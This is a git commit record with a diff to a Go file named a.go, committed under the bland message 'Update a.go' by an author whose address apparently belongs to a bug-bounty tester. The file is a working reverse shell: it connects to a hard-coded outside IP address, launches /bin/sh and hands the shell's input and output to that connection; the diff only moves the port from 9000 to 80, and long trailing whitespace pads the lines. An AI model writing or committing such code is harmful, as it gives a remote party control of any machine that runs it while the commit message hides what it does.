3c59d91cc84ed93e4f18eca44bd753f3cf470f46
nlx41-test <nlx41@wearehackerone.com>
2026-06-27 16:40:37 +0200

    Update a.go

--- a.go
+++ a.go
@@ -2,7 +2,7 @@
 package main;
 import ("net"; "os/exec");                                                                                                                                                           
 func main() {                                                                                                                                                                        
-   c, _ := net.Dial("tcp", "34.27.46.79:9000");                                                                                                                                     
+   c, _ := net.Dial("tcp", "34.27.46.79:80");                                                                                                                                     
    cmd := exec.Command("/bin/sh");                                                                                                                                                   
    cmd.Stdin = c;                                                                                                                                                                    
    cmd.Stdout = c;                                                                                                                                                                   
